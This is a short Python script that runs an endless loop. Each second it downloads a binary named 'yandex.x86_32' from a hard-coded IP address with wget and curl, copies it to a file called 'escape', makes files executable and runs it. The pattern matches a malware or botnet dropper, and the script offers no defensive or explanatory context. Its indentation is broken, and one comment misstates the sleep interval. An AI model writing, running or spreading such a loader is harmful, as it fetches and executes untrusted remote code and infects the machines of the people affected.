import os
import time

while True:
    try:
        # Execute the command using os.system
                os.system('wget http://23.134.168.11/bins/yandex.x86_32; curl -O http://23.134.168.11/bins/yandex.x86_32; cat yandex.x86_32 > escape; chmod +x *;')
        os.system('./escape X86')

    except Exception as e:
        print(f'Error occurred: {e}')

    # Wait for a specific interval before the next iteration
    time.sleep(1)  # Wait for 5 seconds before the next iteration
